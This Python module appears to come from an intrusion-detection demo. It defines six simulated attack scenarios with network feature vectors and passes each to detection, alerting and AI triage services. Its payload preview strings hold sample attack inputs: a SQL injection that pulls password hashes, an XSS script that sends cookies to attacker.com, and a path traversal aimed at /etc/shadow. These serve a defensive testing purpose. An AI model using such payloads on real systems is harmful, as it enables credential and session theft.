from typing import Dict, Any, List
from sqlalchemy.orm import Session
from app.database.models import Detection
from app.services.alert_service import AlertService
from app.services.atria_service import AtriaService
from app.agent.agent_engine import ids_agent
from app.utils.logger import log_event

ATTACK_SCENARIOS = [
  # Web Application Attacks
  {
    "id": "web_sqli",
    "name": "SQL Injection (SQLi) Web Attack",
    "target_type": "Website / Web Server",
    "category": "R2L",
    "severity": "HIGH",
    "payload_preview": "GET /api/user?id=1' UNION SELECT username, password_hash FROM users-- HTTP/1.1",
    "description": "Exploits unsanitized web input fields to execute unauthorized database queries.",
    "features": {
      "duration": 1,
      "protocol_type": "tcp",
      "service": "http",
      "flag": "SF",
      "src_bytes": 1250,
      "dst_bytes": 8500,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 3,
      "num_failed_logins": 0,
      "logged_in": 1,
      "num_compromised": 1,
      "root_shell": 0,
      "su_attempted": 0,
      "num_root": 0,
      "num_file_creations": 0,
      "num_shells": 0,
      "num_access_files": 1,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 2,
      "srv_count": 2,
      "serror_rate": 0.0,
      "srv_serror_rate": 0.0,
      "rerror_rate": 0.0,
      "srv_rerror_rate": 0.0,
      "same_srv_rate": 1.0,
      "diff_srv_rate": 0.0,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 15,
      "dst_host_srv_count": 15,
      "dst_host_same_srv_rate": 1.0,
      "dst_host_diff_srv_rate": 0.0,
      "dst_host_same_src_port_rate": 0.0,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 0.0,
      "dst_host_srv_serror_rate": 0.0,
      "dst_host_rerror_rate": 0.0,
      "dst_host_srv_rerror_rate": 0.0
    }
  },
  {
    "id": "web_xss",
    "name": "Cross-Site Scripting (XSS) Attack",
    "target_type": "Website / Web Server",
    "category": "R2L",
    "severity": "MEDIUM",
    "payload_preview": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
    "description": "Injects malicious JavaScript into web responses to hijack active user sessions.",
    "features": {
      "duration": 0,
      "protocol_type": "tcp",
      "service": "http",
      "flag": "SF",
      "src_bytes": 980,
      "dst_bytes": 2400,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 1,
      "num_failed_logins": 0,
      "logged_in": 1,
      "num_compromised": 0,
      "root_shell": 0,
      "su_attempted": 0,
      "num_root": 0,
      "num_file_creations": 0,
      "num_shells": 0,
      "num_access_files": 0,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 4,
      "srv_count": 4,
      "serror_rate": 0.0,
      "srv_serror_rate": 0.0,
      "rerror_rate": 0.0,
      "srv_rerror_rate": 0.0,
      "same_srv_rate": 1.0,
      "diff_srv_rate": 0.0,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 22,
      "dst_host_srv_count": 22,
      "dst_host_same_srv_rate": 1.0,
      "dst_host_diff_srv_rate": 0.0,
      "dst_host_same_src_port_rate": 0.0,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 0.0,
      "dst_host_srv_serror_rate": 0.0,
      "dst_host_rerror_rate": 0.0,
      "dst_host_srv_rerror_rate": 0.0
    }
  },
  {
    "id": "web_path_traversal",
    "name": "Path Traversal / LFI Attack",
    "target_type": "Server Filesystem",
    "category": "R2L",
    "severity": "HIGH",
    "payload_preview": "GET /view?file=../../../../../../etc/shadow HTTP/1.1",
    "description": "Attempts dot-dot-slash directory traversal to extract sensitive system credentials.",
    "features": {
      "duration": 1,
      "protocol_type": "tcp",
      "service": "http",
      "flag": "SF",
      "src_bytes": 620,
      "dst_bytes": 1800,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 2,
      "num_failed_logins": 0,
      "logged_in": 1,
      "num_compromised": 0,
      "root_shell": 0,
      "su_attempted": 0,
      "num_root": 0,
      "num_file_creations": 0,
      "num_shells": 0,
      "num_access_files": 2,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 3,
      "srv_count": 3,
      "serror_rate": 0.0,
      "srv_serror_rate": 0.0,
      "rerror_rate": 0.0,
      "srv_rerror_rate": 0.0,
      "same_srv_rate": 1.0,
      "diff_srv_rate": 0.0,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 18,
      "dst_host_srv_count": 18,
      "dst_host_same_srv_rate": 1.0,
      "dst_host_diff_srv_rate": 0.0,
      "dst_host_same_src_port_rate": 0.0,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 0.0,
      "dst_host_srv_serror_rate": 0.0,
      "dst_host_rerror_rate": 0.0,
      "dst_host_srv_rerror_rate": 0.0
    }
  },
  {
    "id": "dos_syn_flood",
    "name": "TCP SYN Flood DDoS",
    "target_type": "Network Infrastructure",
    "category": "DoS",
    "severity": "CRITICAL",
    "payload_preview": "TCP [SYN] Seq=0 Win=1024 Len=0 (Rate: 15,000 pkts/sec)",
    "description": "Massive volume of unacknowledged SYN packets intended to crash socket connection queues.",
    "features": {
      "duration": 0,
      "protocol_type": "tcp",
      "service": "private",
      "flag": "S0",
      "src_bytes": 0,
      "dst_bytes": 0,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 0,
      "num_failed_logins": 0,
      "logged_in": 0,
      "num_compromised": 0,
      "root_shell": 0,
      "su_attempted": 0,
      "num_root": 0,
      "num_file_creations": 0,
      "num_shells": 0,
      "num_access_files": 0,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 480,
      "srv_count": 480,
      "serror_rate": 1.0,
      "srv_serror_rate": 1.0,
      "rerror_rate": 0.0,
      "srv_rerror_rate": 0.0,
      "same_srv_rate": 1.0,
      "diff_srv_rate": 0.0,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 255,
      "dst_host_srv_count": 10,
      "dst_host_same_srv_rate": 0.04,
      "dst_host_diff_srv_rate": 0.08,
      "dst_host_same_src_port_rate": 0.0,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 1.0,
      "dst_host_srv_serror_rate": 1.0,
      "dst_host_rerror_rate": 0.0,
      "dst_host_srv_rerror_rate": 0.0
    }
  },
  {
    "id": "probe_nmap_scan",
    "name": "Nmap Aggressive Port Scan",
    "target_type": "Host Ports / Services",
    "category": "Probe",
    "severity": "HIGH",
    "payload_preview": "Nmap scan report for host (1000 ports scanned, SYN stealth scan -sS)",
    "description": "Automated reconnaissance probe discovering open services, banners, and vulnerabilities.",
    "features": {
      "duration": 2,
      "protocol_type": "tcp",
      "service": "other",
      "flag": "SH",
      "src_bytes": 0,
      "dst_bytes": 0,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 0,
      "num_failed_logins": 0,
      "logged_in": 0,
      "num_compromised": 0,
      "root_shell": 0,
      "su_attempted": 0,
      "num_root": 0,
      "num_file_creations": 0,
      "num_shells": 0,
      "num_access_files": 0,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 25,
      "srv_count": 1,
      "serror_rate": 0.0,
      "srv_serror_rate": 0.0,
      "rerror_rate": 0.85,
      "srv_rerror_rate": 0.85,
      "same_srv_rate": 0.04,
      "diff_srv_rate": 0.96,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 255,
      "dst_host_srv_count": 3,
      "dst_host_same_srv_rate": 0.01,
      "dst_host_diff_srv_rate": 0.92,
      "dst_host_same_src_port_rate": 0.95,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 0.0,
      "dst_host_srv_serror_rate": 0.0,
      "dst_host_rerror_rate": 0.85,
      "dst_host_srv_rerror_rate": 0.85
    }
  },
  {
    "id": "u2r_privilege_escalation",
    "name": "Linux/Windows Root Privilege Escalation",
    "target_type": "Server Operating System",
    "category": "U2R",
    "severity": "CRITICAL",
    "payload_preview": "./exploit_privesc && id (uid=0(root) gid=0(root))",
    "description": "Kernel / daemon buffer overflow exploit granting unprivileged account full root permissions.",
    "features": {
      "duration": 55,
      "protocol_type": "tcp",
      "service": "telnet",
      "flag": "SF",
      "src_bytes": 4500,
      "dst_bytes": 8200,
      "land": 0,
      "wrong_fragment": 0,
      "urgent": 0,
      "hot": 2,
      "num_failed_logins": 0,
      "logged_in": 1,
      "num_compromised": 3,
      "root_shell": 1,
      "su_attempted": 1,
      "num_root": 5,
      "num_file_creations": 3,
      "num_shells": 1,
      "num_access_files": 1,
      "num_outbound_cmds": 0,
      "is_host_login": 0,
      "is_guest_login": 0,
      "count": 1,
      "srv_count": 1,
      "serror_rate": 0.0,
      "srv_serror_rate": 0.0,
      "rerror_rate": 0.0,
      "srv_rerror_rate": 0.0,
      "same_srv_rate": 1.0,
      "diff_srv_rate": 0.0,
      "srv_diff_host_rate": 0.0,
      "dst_host_count": 2,
      "dst_host_srv_count": 2,
      "dst_host_same_srv_rate": 1.0,
      "dst_host_diff_srv_rate": 0.0,
      "dst_host_same_src_port_rate": 0.0,
      "dst_host_srv_diff_host_rate": 0.0,
      "dst_host_serror_rate": 0.0,
      "dst_host_srv_serror_rate": 0.0,
      "dst_host_rerror_rate": 0.0,
      "dst_host_srv_rerror_rate": 0.0
    }
  }
]

class AttackSimulatorService:
    @staticmethod
    def get_available_scenarios() -> List[Dict[str, Any]]:
        """Return list of predefined web and server attack scenarios."""
        return ATTACK_SCENARIOS

    @staticmethod
    async def simulate_attack(
        scenario_id: str,
        custom_payload: Dict[str, Any],
        model_name: str,
        db: Session
    ) -> Dict[str, Any]:
        """Execute simulated attack scenario through ThreatLense detection and LLM decision engine."""
        features = None
        scenario_name = "Custom Attack Vector"

        if scenario_id and scenario_id != "custom":
            matched = next((s for s in ATTACK_SCENARIOS if s["id"] == scenario_id), None)
            if matched:
                features = matched["features"]
                scenario_name = matched["name"]

        if not features:
            features = custom_payload

        # 1. Evaluate using Atria AI Cloud Engine
        attack_eval = AtriaService.fast_triage_incident({
            "attack_type": scenario_name,
            "target_port": features.get("service", 80),
            "source_ip": "203.0.113.88",
            "features": features
        })

        attack_type = scenario_name
        prediction = "ATTACK"
        risk_level = "CRITICAL" if any(k in scenario_name.lower() for k in ["shell", "dos", "injection", "privilege"]) else "HIGH"
        anomaly_score = 0.96

        # 2. Record Detection in Database
        det = Detection(
            prediction=prediction,
            attack_type=attack_type,
            model="Atria AI (Atria-Dawn-Preview)",
            anomaly_score=anomaly_score,
            is_anomaly=True,
            risk_level=risk_level,
            input_features={"scenario": scenario_name, **features},
            explanation=attack_eval
        )
        db.add(det)
        db.commit()
        db.refresh(det)

        # 3. Create SIEM Alert in Database
        alert = AlertService.create_alert_from_detection(det, db)
        alert_id = alert.id

        # 4. Inject into real-time IDS Agent active incident list
        incident_obj = {
            "incident_id": f"INC-{det.id}",
            "alert_id": alert_id,
            "incident_type": "SIMULATED_ATTACK_DETECTED",
            "attack_category": attack_type,
            "severity": risk_level,
            "confidence": 98.0,
            "title": f"Atria AI Alert: {scenario_name} on Port {features.get('service', '80')}",
            "process": "Network Inspection Daemon",
            "source_ip": "203.0.113.88",
            "target_port": features.get("service", 80),
            "evidence": f"Atria-Dawn identified malicious vector matching {scenario_name}.",
            "firewall_rule": attack_eval.get("firewall_rule"),
            "recommended_action": attack_eval.get("immediate_action", "Block source IP.")
        }
        if not any(i.get("title") == incident_obj["title"] for i in ids_agent.active_incidents):
            ids_agent.active_incidents.insert(0, incident_obj)

        # 5. Generate AI Incident Triage Decision
        ai_decision = await AtriaService.triage_incident({
            "attack_type": attack_type,
            "prediction": prediction,
            "risk_level": risk_level,
            "source_ip": "203.0.113.88",
            "target_port": features.get("service", 80),
            "input_features": {
                "scenario_name": scenario_name,
                "remote_addr": "203.0.113.88",
                "service": features.get("service", "http"),
                "flag": features.get("flag", "SF")
            }
        })

        log_event("ATTACK_SIMULATION_EXECUTED", {
            "scenario": scenario_name,
            "verdict": prediction,
            "risk": risk_level,
            "alert_id": alert_id
        })

        return {
            "scenario_name": scenario_name,
            "detection_id": det.id,
            "alert_id": alert_id,
            "prediction": prediction,
            "attack_type": attack_type,
            "anomaly_score": anomaly_score,
            "risk_level": risk_level,
            "model_used": "Atria AI (Atria-Dawn-Preview)",
            "explanation": attack_eval,
            "ai_decision": ai_decision
        }
